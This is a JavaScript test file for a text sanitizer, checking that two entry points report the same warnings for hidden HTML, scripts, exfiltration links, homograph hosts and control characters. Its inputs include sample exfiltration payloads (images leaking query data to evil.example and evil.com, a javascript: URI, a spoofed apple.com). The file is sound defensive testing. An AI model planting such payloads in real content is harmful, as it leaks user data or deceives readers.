/**
 * Both entry points that run Layers 1–3 must describe the same finding with the
 * same words, and each case must produce the finding it was written for.
 *
 * `sanitize()` (./src/index.mjs) delegates to `sanitizeText()` (./src/output.mjs)
 * and both read their prose from ./src/warnings.mjs, so the comparison between
 * them is what fails if either re-inlines a string. That comparison alone
 * passes on two empty lists, though — so every case also declares the exact
 * warnings and notes it must yield, built from the warnings.mjs builders where
 * one exists. Both TIERS are pinned: the severity split (./src/severity.mjs)
 * sends some of these sentences to `notes`, and calling a finding a warning in
 * one place and a note in the other is the same drift in a new coordinate.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { sanitize } from "../src/index.mjs";
import { sanitizeText, needsMarkdownPipeline } from "../src/output.mjs";
import {
  LONE_SURROGATE_WARNING,
  UNSCANNABLE_WARNING,
  HTML_UNPARSEABLE_WARNING,
  describeHtmlSanitized,
  describeWarned,
  describeExfil,
  describeConfusableHosts,
} from "../src/warnings.mjs";

const BLOB = "A".repeat(44);
const HEX_HINT =
  " — inspect the removed bytes with a hex dump (xxd / od -c), which survives sanitization";
const hidden1 = describeHtmlSanitized({ comments: 0, hidden: 1 });
const queryImage = describeExfil([
  {
    isImage: true,
    target: "evil.example",
    reason: "suspicious query parameter",
  },
]);

/**
 * One input per Layer-1/2/3 branch, each with the exact findings it must yield.
 * @type {Array<[name: string, input: string, warnings: string[], notes?: string[]]>}
 */
const CASES = [
  [
    "comment only",
    "a <!-- hi --> b",
    [describeHtmlSanitized({ comments: 1, hidden: 0 })],
  ],
  ["hidden element", "a <span hidden>S</span> b", [hidden1]],
  [
    "comment + hidden",
    "a <!-- one --> b <span hidden>S</span> c",
    [describeHtmlSanitized({ comments: 1, hidden: 1 })],
  ],
  [
    "preserved script",
    "see <script>x</script> source",
    [],
    [describeWarned({ tags: { script: 1 }, dataSrc: 0 })],
  ],
  [
    "preserved script x2 + data URI",
    '<script>a</script><script>b</script><img src="data:text/html,x">',
    [
      describeExfil([
        {
          isImage: true,
          target: "(inline data: URI)",
          reason: "active-content data: URI",
        },
      ]),
    ],
    [describeWarned({ tags: { script: 2 }, dataSrc: 1 })],
  ],
  [
    "one exfil reason",
    `![alt](https://evil.example/p?data=${BLOB})`,
    [queryImage],
  ],
  [
    "two exfil reasons, links only (a NOTE)",
    `[a](https://evil.example/p?data=${BLOB}) and [b](javascript:alert(1))`,
    [],
    [
      describeExfil([
        {
          isImage: false,
          target: "evil.example",
          reason: "suspicious query parameter",
        },
        { isImage: false, target: "", reason: "script-executing URI" },
      ]),
    ],
  ],
  [
    "exfil inside a hidden element",
    `<div hidden><img src="https://evil.example/x?data=${BLOB}"></div>`,
    [hidden1, queryImage],
  ],
  [
    "look-alike host",
    "see [docs](https://аpple.com/x)",
    [
      describeConfusableHosts([
        { description: 'аpple.com (xn--pple-43d.com) reads as "apple.com"' },
      ]),
    ],
  ],
  [
    "too deep to scan",
    `${"<div>".repeat(5000)}https://x.example/`,
    [HTML_UNPARSEABLE_WARNING, UNSCANNABLE_WARNING],
  ],
  [
    "zero-width char beside spliced html",
    "a\u200b<i hidden>S</i> b",
    [`Stripped: Format chars (Cf)${HEX_HINT}`, hidden1],
  ],
  [
    "lone surrogate beside spliced html",
    "a\ud800<i hidden>S</i> b",
    [LONE_SURROGATE_WARNING, hidden1],
  ],
  [
    "ansi escape beside spliced html",
    "a\u001b[31mred\u001b[0m <i hidden>S</i> b",
    [`Stripped: ANSI escapes${HEX_HINT}`, hidden1],
  ],
  ["benign html (the one silent case)", "hello <b>world</b>", []],
];

describe("warning parity between sanitize() and sanitizeText()", () => {
  it("the corpus is not vacuous: every case but one declares a finding", () => {
    const silent = CASES.filter(
      ([, , warnings, notes = []]) => warnings.length + notes.length === 0,
    );
    assert.deepEqual(
      silent.map(([name]) => name),
      ["benign html (the one silent case)"],
    );
  });

  for (const [name, input, warnings, notes = []] of CASES)
    it(`${name}: both entry points emit exactly the declared findings`, async () => {
      for (const r of [
        await sanitize(input, { html: true }),
        await sanitizeText(input, { html: true, exfilScan: true }),
      ])
        assert.deepEqual(
          { warnings: r.warnings, notes: r.notes },
          { warnings, notes },
        );
    });

  it("both entry points honor flagDigestValues, and neither invents it", async () => {
    // The root entry forwards the option through a second module, so it is the
    // half that can silently drop it while the pipeline half keeps working.
    const input = `<img src="https://evil.com/x?h=${"a".repeat(40)}">`;
    const options = { exfilScan: true, flagDigestValues: true };
    const root = await sanitize(input, options);
    const pipeline = await sanitizeText(input, options);
    assert.deepEqual(root.warnings, pipeline.warnings);
    assert.deepEqual(root.notes, pipeline.notes);
    assert.ok(root.warnings.some((w) => /image to evil\.com/.test(w)));
    // Non-vacuity: the same input is silent at BOTH entries without the option,
    // so the assertion above is the option working and not the URL firing on
    // some other arm.
    for (const quiet of [
      await sanitize(input, { exfilScan: true }),
      await sanitizeText(input, { exfilScan: true }),
    ])
      assert.deepEqual(quiet.warnings, []);
  });

  it("both entry points skip the HTML graph on exactly the same inputs", async () => {
    // Gate-false text must come back untouched and finding-free from the root
    // entry even with `html: true`.
    const gateFalse = "plain prose, nothing here — 1 < 2 and 3 > 2";
    assert.equal(needsMarkdownPipeline(gateFalse), false);
    const root = await sanitize(gateFalse, { html: true });
    assert.equal(root.cleaned, gateFalse);
    assert.deepEqual(root.warnings, []);
    assert.deepEqual(root.notes, []);
    assert.deepEqual(root.found, []);

    // And the gate is not vacuously false: a tagged input still reaches Layer 2.
    const gateTrue = "a <span hidden>S</span> b";
    assert.equal(needsMarkdownPipeline(gateTrue), true);
    const reached = await sanitize(gateTrue, { html: true });
    assert.deepEqual(reached.warnings, [hidden1]);
  });
});
